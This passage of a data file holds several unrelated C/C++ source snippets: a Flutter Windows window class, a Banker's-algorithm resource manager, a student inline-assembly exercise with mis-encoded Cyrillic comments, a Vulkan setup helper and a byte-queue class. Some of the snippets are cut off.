Enter Sections of Chapter(1/2/3): 2\r\n Enter Section Name: Sequectial_Stack\r\n Enter Section Name: Liked_Stack\r\n\r\n Enter Sections of Chapter(1/2/3): 3\r\n Enter Section Name: Simple_Queue\r\n Enter Section Name: Circular_Queue\r\n Book Name: Data_Structures\r\n Chapter 01: Ch01_Array\r\n Section 01: 1D_Array\r\n Section 02: 2D_Array\r\n Chapter 02: Ch02_Stack\r\n Section 01: Sequectial_Stack\r\n Section 02: Liked_Stack\r\n Chapter 03: Ch03_Queue\r\n Section 01: Simple_Queue\r\n Section 02: Circular_Queue\r\n...Program finished with exit code 0\r\nPress ENTER to exit console.\r\n*/",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\n#include <sstream>\n#include <map>\n#include <queue>\n#include <algorithm>\n#include <unistd.h>\n#include <sys/wait.h>\n#include <semaphore.h>\n#include <chrono>\n#include <thread>\n\nusing namespace std;\n\nstruct ResourceType {\n    std::string name;\n    std::vector<std::string> instances;\n};\n\nstruct Process {\n    int pid;\n    int deadline;\n    int computationTime;\n    std::vector<std::string> instructions;\n};\n\nstd::vector<ResourceType> resources;\nstd::map<int, Process> processes;\nsem_t resourceMutex; // Semaphore for resource access\nstd::vector<int> Available; // Available resources\nstd::vector<std::vector<int>> Max; // Maximum demand\nstd::vector<std::vector<int>> Allocation; // Current allocation\nstd::vector<std::vector<int>> Need; // Remaining needs\n\nsem_t mutex; // Semaphore for synchronization\n\nvoid parseResources(const std::string& filename) {\n    std::ifstream file(filename);\n    std::string line;\n    while (getline(file, line)) {\n        std::istringstream iss(line);\n        ResourceType resource;\n        std::getline(iss, resource.name, ':');\n        resource.name = resource.name.substr(resource.name.find_first_not_of(\" R\"), resource.name.npos);\n        std::string instance;\n        while (getline(iss, instance, ',')) {\n            resource.instances.push_back(instance.substr(instance.find_first_not_of(\" \"), instance.npos));\n        }\n        resources.push_back(resource);\n    }\n}\n\nvoid parseProcesses(const std::string& filename) {\n    std::ifstream file(filename);\n    std::string line;\n    Process currentProcess;\n    int processId = 0;\n    while (getline(file, line)) {\n        if (line.find(\"process_\") != std::string::npos) {\n            if (currentProcess.pid != 0) {\n                processes[currentProcess.pid] = currentProcess;\n                currentProcess.instructions.clear();\n            }\n            currentProcess.pid = ++processId;\n        } else if (!line.empty()) {\n            currentProcess.instructions.push_back(line);\n        }\n    }\n    if (currentProcess.pid != 0) {\n        processes[currentProcess.pid] = currentProcess;\n    }\n}\n\nbool isSafe() {\n    std::vector<bool> Finish(Max.size(), false);\n    std::vector<int> Work = Available;\n\n    while (true) {\n        bool found = false;\n        for (int i = 0; i < Max.size(); ++i) {\n            if (!Finish[i]) {\n                bool possible = true;\n                for (int j = 0; j < Available.size(); ++j) {\n                    if (Need[i][j] > Work[j]) {\n                        possible = false;\n                        break;\n                    }\n                }\n                if (possible) {\n                    for (int k = 0; k < Available.size(); ++k)\n                        Work[k] += Allocation[i][k];\n                    Finish[i] = true;\n                    found = true;\n                }\n            }\n        }\n        if (!found) break; // No allocation was possible in this loop iteration\n    }\n\n    // If all processes can finish, the system is in a safe state\n    for (bool f : Finish) if (!f) return false;\n    return true;\n}\n\nbool requestResources(int processId, const std::vector<int>& request) {\n    sem_wait(&mutex); // Begin critical section\n\n    // Check if request can be satisfied\n    for (int i = 0; i < request.size(); ++i) {\n        if (request[i] > Need[processId][i] || request[i] > Available[i]) {\n            sem_post(&mutex); // End critical section\n            return false; // Request cannot be satisfied immediately\n        }\n    }\n\n    // Temporarily allocate requested resources\n    for (int i = 0; i < request.size(); ++i) {\n        Available[i] -= request[i];\n        Allocation[processId][i] += request[i];\n        Need[processId][i] -= request[i];\n    }\n\n    // Check for safe state\n    if (!isSafe()) {\n        // Rollback resources\n        for (int i = 0; i < request.size(); ++i) {\n            Available[i] += request[i];\n            Allocation[processId][i] -= request[i];\n            Need[processId][i] += request[i];\n        }\n        sem_post(&mutex); // End critical section\n        return false; // Request cannot be granted due to unsafe state\n    }\n\n    sem_post(&mutex); // End critical section\n    return true; // Request granted\n}\n\nvoid useResources(int processId, const std::vector<int>& use) {\n    std::cout << \"Using resources for Process \" << processId << \": \";\n    for (size_t i = 0; i < resources.size(); ++i) {\n        const auto& res = resources[i];\n        for (int j = 0; j < use[i]; ++j) {\n            std::cout << res.instances[j] << \" \";\n        }\n    }\n    std::cout << std::endl;\n}\n\nvoid releaseResources(int processId, const std::vector<int>& release) {\n    sem_wait(&mutex); // Begin critical section\n\n    // Release resources\n    for (int i = 0; i < release.size(); ++i) {\n        Available[i] += release[i];\n        Allocation[processId][i] -= release[i];\n        Need[processId][i] += release[i];\n    }\n\n    sem_post(&mutex); // End critic",
    "#include <iostream>\r\nvoid Task1()\r\n{\r\n\tint a, b, c, d, x;\r\n\tint values[5] = { 0, 0, 0, 0, 0 }; // \u00ec\u00e0\u00f1\u00e8\u00e2 \u00e4\u00eb\u00ff \u00e7\u00e1\u00e5\u00f0\u00e5\u00e6\u00e5\u00ed\u00ed\u00ff \u00f3(\u00f5)\r\n\r\n\ta = -6; b = 4; c = 8; d = 2;\r\n\t__asm {\r\n\t\tmov eax, [values]\r\n\t\tpush eax // \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00f3 \u00f1\u00f2\u00e5\u00ea \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3 \u00ef\u00ee\u00f7\u00e0\u00f2\u00ea\u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tmov cx, 5 // \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00ef\u00f0\u00ee\u00f5\u00ee\u00e4\u00b3\u00e2 \u00f6\u00e8\u00ea\u00eb\u00f3 \r\n\tstart: // \u00ef\u00ee\u00f7\u00e0\u00f2\u00ee\u00ea \u00f6\u00e8\u00ea\u00eb\u00f3\r\n\t\tmov ax, 3 // \u00e4\u00eb\u00ff \u00ee\u00e1\u00f7\u00e8\u00f1\u00eb\u00e5\u00ed\u00ed\u00ff x = 3 - \u00f1\u00f5 \r\n\t\tsub ax, cx // \u00ee\u00f2\u00f0\u00e8\u00ec\u00f3\u00ba\u00ec\u00ee \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00ed\u00ff \u00f5\r\n\t\tcwde // \u00f0\u00ee\u00e7\u00f8\u00e8\u00f0\u00fe\u00ba\u00ec\u00ee ax \u00e4\u00ee eax\r\n\t\tmov ebx, eax // \u00e7\u00e0\u00ef\u00e8\u00f1\u00f3\u00ba\u00ec\u00ee x \u00e2 ebx\r\n\t\tmov eax, a // \u00f1\u00f2\u00e0\u00eb\u00e0 \u00e0\r\n\t\tcmp ebx, 1 // \u00ef\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba\u00ec\u00ee \u00f5 \u00e7 \u00ee\u00e4\u00e8\u00ed\u00e8\u00f6\u00e5\u00fe\r\n\t\tjl less_ // \u00ff\u00ea\u00f9\u00ee \u00f5 \u00ec\u00e5\u00ed\u00f8\u00e5 1, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 less\r\n\t\tje equals // \u00ff\u00ea\u00f9\u00ee \u00f5 \u00e4\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba 1, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee equals\r\n\r\n\t\timul eax // a^2\r\n\t\tsub eax, ebx // a^2-x\r\n\t\tcdq // \u00f0\u00ee\u00e7\u00f8\u00e8\u00f0\u00fe\u00ba\u00ec\u00ee a^2-x \u00e4\u00ee \u00f7\u00e5\u00f2\u00e2\u00b3\u00f0\u00ed\u00ee\u00e3\u00ee \u00f1\u00eb\u00ee\u00e2\u00e0\r\n\t\tmov ebx, c // \u00f1\u00f2\u00e0\u00eb\u00e0 c\r\n\t\tidiv ebx // (a^2-x)/c\r\n\t\tjmp result // \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 result\r\n\tless_:\r\n\t\tmov edx, 2\r\n\t\timul edx // a*2\r\n\t\timul ebx // a*2*x\r\n\t\tadd eax, 5 // a*2*x+5\r\n\t\tjmp result // \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 result\r\n\tequals:\r\n\t\tmov ebx, b // \u00f1\u00f2\u00e0\u00eb\u00e0 b\r\n\t\tsub eax, ebx // a-b\r\n\t\tcdq // \u00f0\u00ee\u00e7\u00f8\u00e8\u00f0\u00fe\u00ba\u00ec\u00ee a-b \u00e4\u00ee \u00f7\u00e5\u00f2\u00e2\u00b3\u00f0\u00ed\u00ee\u00e3\u00ee \u00f1\u00eb\u00ee\u00e2\u00e0\r\n\t\tmov ebx, d // \u00f1\u00f2\u00e0\u00eb\u00e0 d\r\n\t\tidiv ebx // (a-b)/d\r\n\t\tjmp result // \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 result\r\n\tresult:\r\n\t\tpop ebx // \u00e2\u00e8\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00e7\u00b3 \u00f1\u00f2\u00e5\u00ea\u00f3 \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tmov[values + ebx], eax // \u00e7\u00e0\u00ef\u00e8\u00f1\u00f3\u00ba\u00ec\u00ee \u00f0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2 \u00e7\u00e0 \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00ee\u00fe \u00e0\u00e4\u00f0\u00e5\u00f1\u00ee\u00fe\r\n\t\tadd ebx, 4 // \u00e7\u00f1\u00f3\u00e2\u00e0\u00ba\u00ec\u00ee \u00e2\u00ea\u00e0\u00e7\u00b3\u00e2\u00ed\u00e8\u00ea \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tpush ebx // \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00e2 \u00f1\u00f2\u00e5\u00ea \u00ed\u00ee\u00e2\u00f3 \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3\r\n\t\tloop start // \u00ea\u00b3\u00ed\u00e5\u00f6\u00fc \u00f6\u00e8\u00ea\u00eb\u00f3\r\n\t\tpop ebx\r\n\t}\r\n\tfor (int i = 0; i < 5; i++) \r\n\t{\r\n\t\tstd::cout << values[i] << std::endl;\r\n\t}\r\n\tsystem(\"pause\");\r\n}\r\n\r\nvoid Option15()\r\n{\r\n\tint a = 7;\r\n\tint y1, y2;\r\n\tint values[5] = { 0, 0, 0, 0, 0 };\r\n\t// x1\r\n\r\n\t// x - ebx\r\n\t// a - eax\r\n\r\n\t__asm\r\n\t{\r\n\t\tmov eax, [values]\r\n\t\tpush eax\t\t\t\t// \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00f3 \u00f1\u00f2\u00e5\u00ea \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3 \u00ef\u00ee\u00f7\u00e0\u00f2\u00ea\u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tmov cx, 5\t\t\t\t// \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00ef\u00f0\u00ee\u00f5\u00ee\u00e4\u00b3\u00e2 \u00f6\u00e8\u00ea\u00eb\u00f3 \r\n\tstart:\r\n\t\tmov ax, 3\t\t\t\t// \u00e4\u00eb\u00ff \u00ee\u00e1\u00f7\u00e8\u00f1\u00eb\u00e5\u00ed\u00ed\u00ff x = 3 - \u00f1\u00f5 \r\n\t\tsub ax, cx\t\t\t\t// \u00ee\u00f2\u00f0\u00e8\u00ec\u00f3\u00ba\u00ec\u00ee \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00ed\u00ff \u00f5\r\n\t\tcwde\t\t\t\t\t// \u00f0\u00ee\u00e7\u00f8\u00e8\u00f0\u00fe\u00ba\u00ec\u00ee ax \u00e4\u00ee eax\r\n\t\tmov ebx, eax\t\t\t// \u00e7\u00e0\u00ef\u00e8\u00f1\u00f3\u00ba\u00ec\u00ee x \u00e2 ebx\r\n\t\tmov eax, a\t\t\t\t// \u00f1\u00f2\u00e0\u00eb\u00e0 \u00e0\r\n\t\tcmp ebx, 1\t\t\t\t// \u00ef\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba\u00ec\u00ee \u00f5 \u00e7 \u00ee\u00e4\u00e8\u00ed\u00e8\u00f6\u00e5\u00fe\r\n\t\tjl isLess\t\t\t\t// \u00ff\u00ea\u00f9\u00ee \u00f5 \u00ec\u00e5\u00ed\u00f8\u00e5 1, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 isLess\r\n\t\tjge greatEqual\t\t\t// \u00ff\u00ea\u00f9\u00ee \u00f5 \u00e4\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba \u00e0\u00e1\u00ee \u00e1\u00b3\u00eb\u00fc\u00f8\u00e5 1, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee greatEqual\r\n\tisLess:\r\n\t\t// 8 + |x|\r\n\t\tcmp ebx, 0\r\n\t\tjl abs_x_is_less\r\n\t\t\tabs_x_is_less: \r\n\t\t\t\tneg ebx\r\n\t\tmov eax, ebx\r\n\t\tadd eax, 8\r\n\t\tjmp result\r\n\tgreatEqual:\r\n\t\t// 2 * |a|\r\n\t\tmov edx, 2\r\n\t\tcmp eax, 0\r\n\t\tmul edx\t\t\t\t\t// mul \u00e2\u00e8\u00ea\u00ee\u00ed\u00f3\u00ba \u00e1\u00e5\u00e7\u00e7\u00ed\u00e0\u00ea\u00ee\u00e2\u00e5 \u00ec\u00ed\u00ee\u00e6\u00e5\u00ed\u00ed\u00ff \u00f0\u00e5\u00e3\u00b3\u00f1\u00f2\u00f0\u00e0 edx \u00ed\u00e0 eax\r\n\t\tjmp result\r\n\tresult:\r\n\t\tpop ebx\t\t\t\t\t// \u00e2\u00e8\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00e7\u00b3 \u00f1\u00f2\u00e5\u00ea\u00f3 \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tmov[values + ebx], eax\t// \u00e7\u00e0\u00ef\u00e8\u00f1\u00f3\u00ba\u00ec\u00ee \u00f0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2 \u00e7\u00e0 \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00ee\u00fe \u00e0\u00e4\u00f0\u00e5\u00f1\u00ee\u00fe\r\n\t\tadd ebx, 4\t\t\t\t// \u00e7\u00f1\u00f3\u00e2\u00e0\u00ba\u00ec\u00ee \u00e2\u00ea\u00e0\u00e7\u00b3\u00e2\u00ed\u00e8\u00ea \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tpush ebx\t\t\t\t// \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00e2 \u00f1\u00f2\u00e5\u00ea \u00ed\u00ee\u00e2\u00f3 \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3\r\n\t\tloop start\t\t\t\t// \u00ea\u00b3\u00ed\u00e5\u00f6\u00fc \u00f6\u00e8\u00ea\u00eb\u00f3\r\n\t\tpop ebx\r\n\t}\r\n\tfor (int i = 0; i < 5; i++)\r\n\t{\r\n\t\tstd::cout << values[i] << std::endl;\r\n\t}\r\n\tint secOperand;\r\n\t__asm\r\n\t{\r\n\t\tmov eax, 0\r\n\t\tpush eax\t\t\t\t// \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00f3 \u00f1\u00f2\u00e5\u00ea \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3 \u00ef\u00ee\u00f7\u00e0\u00f2\u00ea\u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tmov cx, 5\t\t\t\t// \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00ef\u00f0\u00ee\u00f5\u00ee\u00e4\u00b3\u00e2 \u00f6\u00e8\u00ea\u00eb\u00f3 \r\n\tstart1:\r\n\t\tmov ax, 3\t\t\t\t// \u00e4\u00eb\u00ff \u00ee\u00e1\u00f7\u00e8\u00f1\u00eb\u00e5\u00ed\u00ed\u00ff x = 3 - \u00f1\u00f5 \r\n\t\tsub ax, cx\t\t\t\t// \u00ee\u00f2\u00f0\u00e8\u00ec\u00f3\u00ba\u00ec\u00ee \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00ed\u00ff \u00f5\r\n\t\tcmp cx, 0\r\n\t\t\tje end_\r\n\t\tcwde\t\t\t\t\t// \u00f0\u00ee\u00e7\u00f8\u00e8\u00f0\u00fe\u00ba\u00ec\u00ee ax \u00e4\u00ee eax\r\n\t\tmov ebx, eax\t\t\t// \u00e7\u00e0\u00ef\u00e8\u00f1\u00f3\u00ba\u00ec\u00ee x \u00e2 ebx\r\n\t\tmov eax, a\t\t\t\t// \u00f1\u00f2\u00e0\u00eb\u00e0 \u00e0\r\n\t\tcmp ebx, eax\t\t\t// \u00ef\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba\u00ec\u00ee \u00f5 \u00e7 a\r\n\t\tje Equals\t\t\t\t// \u00ff\u00ea\u00f9\u00ee \u00f5 \u00e4\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba a, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 Equals\r\n\t\tjne nonEqual\t\t\t// \u00ff\u00ea\u00f9\u00ee \u00f5 \u00ed\u00e5 \u00e4\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba \u00e0, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee nonEqual\r\n\tEquals:\r\n\t\t// 3\r\n\t\tmov eax, 3\r\n\t\tjmp result1\r\n\tnonEqual:\r\n\t\t// a + 1\r\n\t\tmov eax, a\r\n\t\tadd eax, 1\r\n\t\tjmp result1\r\n\tresult1:\r\n\t\t/* div <\u00ee\u00ef\u00e5\u00f0\u00e0\u00ed\u00e4>\r\n\t\t\u00c2\u00e8\u00ea\u00ee\u00ed\u00f3\u00ba \u00e1\u00e5\u00e7\u00e7\u00ed\u00e0\u00ea\u00ee\u00e2\u00e5 \u00e4\u00b3\u00eb\u00e5\u00ed\u00ed\u00ff \u00f0\u00e5\u00e3\u00b3\u00f1\u00f2\u00f0\u00b3\u00e2 EDX : EAX(RDX : RAX) \u00ed\u00e0 \u00ee\u00ef\u00e5\u00f0\u00e0\u00ed\u00e4.\r\n\t\t\u00d0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2 \u00e4\u00b3\u00eb\u00e5\u00ed\u00ed\u00ff \u00e7\u00e1\u00e5\u00f0\u00b3\u00e3\u00e0\u00ba\u00f2\u00fc\u00f1\u00ff \u00e2 EAX(RAX), \u00e0 \u00ee\u00f1\u00f2\u00e0\u00f7\u00e0 \u00e2 EDX(RDX).*/\r\n\t\tcdq\r\n\t\tpop ebx\r\n\t\tmov secOperand, eax\r\n\t\tmov eax, [values + ebx]\r\n\t\tdiv secOperand\r\n\t\tmov[values + ebx], edx\r\n\t\tadd ebx, 4\t\t\t\t// \u00e7\u00f1\u00f3\u00e2\u00e0\u00ba\u00ec\u00ee \u00e2\u00ea\u00e0\u00e7\u00b3\u00e2\u00ed\u00e8\u00ea \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tpush ebx\t\t\t\t// \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00e2 \u00f1\u00f2\u00e5\u00ea \u00ed\u00ee\u00e2\u00f3 \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3\r\n\t\tloop start1\t\t\t\t// \u00ea\u00b3\u00ed\u00e5\u00f6\u00fc \u00f6\u00e8\u00ea\u00eb\u00f3\r\n\t\tpop ebx\r\n\tend_:\r\n\t\tpop ebx\r\n\t}\r\n\tfor (int i = 0; i < 5; i++)\r\n\t{\r\n\t\tstd::cout << values[i] << std::endl;\r\n\t}\r\n\tsystem(\"pause\");\r\n}\r\n\r\nint main() \r\n{\r\n\tTask1();\r\n\tOption15();\r\n\treturn 0;\r\n}\r\n",
    "\n#include \"VkHelper.h\"\n#include \"VkShaderParam.h\"\n#include \"Geometry.h\"\n\nconst DriverFeature validationInstanceLayers[] = {\n        {\"VK_LAYER_KHRONOS_validation\",    false, false}\n};\n\nconst DriverFeature validationInstanceExtensions[] = {\n        {VK_KHR_SURFACE_EXTENSION_NAME,          false,     true},\n        {VK_KHR_ANDROID_SURFACE_EXTENSION_NAME,    false,     true},\n#ifdef RENDER_USE_SINGLE_BUFFER\n        {VK_KHR_GET_SURFACE_CAPABILITIES_2_EXTENSION_NAME, false, true},\n#endif\n        {VK_KHR_EXTERNAL_MEMORY_CAPABILITIES_EXTENSION_NAME, false,     true},\n        {VK_KHR_EXTERNAL_SEMAPHORE_CAPABILITIES_EXTENSION_NAME, false,  true},\n        {VK_KHR_GET_PHYSICAL_DEVICE_PROPERTIES_2_EXTENSION_NAME, false, true}\n};\n\nconst DriverFeature validationDeviceExtensions[] = {\n        {VK_KHR_SWAPCHAIN_EXTENSION_NAME, false, true},\n#ifdef RENDER_USE_SINGLE_BUFFER\n        {VK_KHR_SHARED_PRESENTABLE_IMAGE_EXTENSION_NAME, false, true},\n#endif\n        {VK_KHR_MAINTENANCE1_EXTENSION_NAME, false, true},\n        {VK_KHR_BIND_MEMORY_2_EXTENSION_NAME, false, true},\n        {VK_KHR_GET_MEMORY_REQUIREMENTS_2_EXTENSION_NAME, false, true},\n        {VK_KHR_SAMPLER_YCBCR_CONVERSION_EXTENSION_NAME, false, true},\n        {VK_EXT_QUEUE_FAMILY_FOREIGN_EXTENSION_NAME, false, true},\n        {VK_KHR_EXTERNAL_MEMORY_EXTENSION_NAME, false, true},\n        {VK_KHR_EXTERNAL_SEMAPHORE_EXTENSION_NAME, false, true},\n        {VK_KHR_EXTERNAL_SEMAPHORE_FD_EXTENSION_NAME, false, true},\n        {VK_KHR_DEDICATED_ALLOCATION_EXTENSION_NAME, false, true},\n        {VK_ANDROID_EXTERNAL_MEMORY_ANDROID_HARDWARE_BUFFER_EXTENSION_NAME, false, true}\n};\n\nVkBool32 debugReportCallback(VkDebugReportFlagsEXT msgFlags, VkDebugReportObjectTypeEXT objType, uint64_t srcObject,\n                             size_t location, int32_t msgCode, const char *pLayerPrefix, const char *pMsg, void *pUserData){\n    if(msgFlags |= VK_DEBUG_REPORT_ERROR_BIT_EXT){\n        LOG_E(\"%s: [%s] Code %d : %s\", \"Error\", pLayerPrefix, msgCode, pMsg);\n    } else if(msgFlags |= VK_DEBUG_REPORT_WARNING_BIT_EXT) {\n        LOG_W(\"%s: [%s] Code %d : %s\", \"Warning\", pLayerPrefix, msgCode, pMsg);\n    } else {\n        LOG_D(\"%s: [%s] Code %d : %s\", \"Info\", pLayerPrefix, msgCode, pMsg);\n    }\n    return VK_FALSE;\n}\n\nvoid VkHelper::createInstance(bool bValidate, VkInstance *out_instance, VkDebugReportCallbackEXT *out_debugReport) {\n    //instance layers\n    uint32_t availableLayerCount;\n    CALL_VK(vkEnumerateInstanceLayerProperties(&availableLayerCount, nullptr));\n    VkLayerProperties availableLayerProps[availableLayerCount];\n    CALL_VK(vkEnumerateInstanceLayerProperties(&availableLayerCount, availableLayerProps));\n    LOG_D(\"---------------------------------\");\n    const char *enabledLayerNames[32] = {};\n    uint32_t enabledLayerCount = 0;\n    checkFeatures(\"Instance Layers\", bValidate, false, validationInstanceLayers, ARRAY_SIZE(validationInstanceLayers),\n                  availableLayerProps, availableLayerCount, enabledLayerNames, &enabledLayerCount);\n\n    //instance extensions\n    uint32_t availableExtensionCount;\n    CALL_VK(vkEnumerateInstanceExtensionProperties(nullptr, &availableExtensionCount, nullptr));\n    VkExtensionProperties availableExtensionProps[availableExtensionCount];\n    CALL_VK(vkEnumerateInstanceExtensionProperties(nullptr, &availableExtensionCount, availableExtensionProps));\n    LOG_D(\"---------------------------------\");\n    const char *enableExtensionNames[32] = {};\n    uint32_t enableExtensionCount = 0;\n    checkFeatures(\"Instance Extensions\", bValidate, true, validationInstanceExtensions, ARRAY_SIZE(validationInstanceExtensions),\n                  availableExtensionProps, availableExtensionCount, enableExtensionNames, &enableExtensionCount);\n\n    VkApplicationInfo application = {\n            .sType = VK_STRUCTURE_TYPE_APPLICATION_INFO,\n            .pNext = nullptr,\n            .pApplicationName = APP_NAME,\n            .applicationVersion = VK_MAKE_VERSION(1, 0, 0),\n            .pEngineName = APP_NAME,\n            .engineVersion = VK_MAKE_VERSION(1, 0, 0),\n            .apiVersion = VK_MAKE_VERSION(1, 3, 0)\n    };\n\n    VkInstanceCreateInfo createInfo = {\n            .sType = VK_STRUCTURE_TYPE_INSTANCE_CREATE_INFO,\n            .pNext = nullptr,\n            .flags = 0,\n            .pApplicationInfo = &application,\n            .enabledLayerCount = enabledLayerCount,\n            .ppEnabledLayerNames = enabledLayerCount == 0 ? nullptr : enabledLayerNames,\n            .enabledExtensionCount = enableExtensionCount,\n            .ppEnabledExtensionNames = enableExtensionCount == 0 ? nullptr : enableExtensionNames\n    };\n\n    //\u5728\u521b\u5efaVkInstance\u4e4b\u524d\n    if(bValidate){\n        VkDebugReportCallbackCreateInfoEXT debugReport = {\n                .sType = VK_STRUCTURE_TYPE_DEBUG_REPORT_CALLBACK_CREATE_INFO_EXT,\n                .pNext = nullptr,\n                .flags = VK_DEBUG_REPORT_ERROR_BIT_EXT |\t\t\t\t//\u9519\u8bef\u4fe1\u606f\n                         VK_DEBUG_REPORT_WARNING_BIT_EXT |\t\t\t\t//\u8b66\u544a\u4fe1\u606f\n              ",
    "\ufeff// SCS_TEST.cpp : Tento soubor obsahuje funkci main. Prov\u00e1d\u011bn\u00ed programu se tam zahajuje a ukon\u010duje.\n//\n\n#include <iostream>\n\nclass Byte_Queue {\n    int length;\n    int* pointer;\npublic:\n    // Constructor\n    explicit Byte_Queue(int l, int* p) { length = l; pointer = p; }\n    // Destructor\n    //~Byte_Queue() { delete (pointer); }\n    // Functions\n    int get_length() {\n        return length;\n    }\n    int get_byte(int position) {\n        return pointer[position];\n    }\n    int* update_pointer(int* new_pointer) {\n        pointer = new_pointer;\n        return pointer;\n    }\n    int update_length(int new_length) {\n        length = new_length;\n        return length;\n    }\n};\n\nvoid on_out_of_memory()\n{\n    printf(\"\\nOut of memory \\n\");\n    